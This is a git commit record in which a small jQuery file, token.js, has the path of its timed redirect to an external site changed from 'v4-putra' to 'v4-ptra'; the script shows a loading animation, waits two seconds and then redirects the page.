6475843272a53203448d026f020277ac6f16edcf
dodypribadi5 <dodypribadi5@gmail.com>
2025-03-11 16:38:36 +0700

    Update token.js

--- token.js
+++ token.js
@@ -5,7 +5,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://anjayhostjon.cloud/wa/v4-putra';
+location.href='https://anjayhostjon.cloud/wa/v4-ptra';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
